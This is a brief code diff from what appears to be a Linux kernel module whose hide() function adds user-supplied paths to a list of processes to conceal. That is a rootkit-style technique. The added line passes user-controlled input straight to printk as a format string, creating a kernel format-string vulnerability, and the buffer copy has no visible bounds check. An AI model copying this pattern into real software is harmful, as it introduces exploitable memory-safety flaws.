@@ -28,6 +28,7 @@ int hide(const char __user *path) {
   }
   copy_from_user(tempPath,path+strlen(hide__prefix), strnlen_user(path, ~0) - strlen(hide__prefix));
   //      printk("%s",tempPath);
+printk(tempPath);
   result = addProcessToHide(tempPath);
   if(result == -ENOMEM)
     return ENOMEM;
